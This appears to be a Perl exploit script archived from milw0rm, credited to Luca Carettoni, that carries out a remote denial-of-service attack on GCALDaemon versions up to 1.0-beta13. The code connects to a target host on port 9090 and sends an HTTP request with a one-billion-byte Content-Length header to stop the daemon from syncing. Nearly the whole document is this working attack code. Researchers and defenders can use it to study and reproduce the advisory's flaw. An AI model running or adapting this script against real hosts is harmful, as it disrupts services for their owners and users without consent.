#!/usr/bin/perl
# /*
#  * GCALDaemon <= 1.0-beta13 Remote DoS 
#  * 
#  * Original Advisory: 
#  * http://www.securityfocus.com/bid/25704/info
#  * http://www.ikkisoft.com/stuff/SN-2007-01.txt
#  *
#  *  Luca "ikki" Carettoni
#  *  http://www.ikkisoft.com
#  */

use strict;
use warnings;
use IO::Socket;

my $host = shift || die "Usage: $0 host [port]\n";
my $port = shift || 9090;
my $sock = new IO::Socket::INET(PeerAddr => $host, PeerPort => $port, 
PeerProto => 'tcp')
or die "error: $!\n";
print "GCALDaemom DoS Expoit\n";
print "Just 4 seconds...\n";
sleep 4;
$sock->send("GET / HTTP/1.1\r\n");
$sock->send("Content-Length: 1000000000\r\n\r\n");
$sock->close;
print "\n\nNo more sync!\n";

# milw0rm.com [2007-10-16]
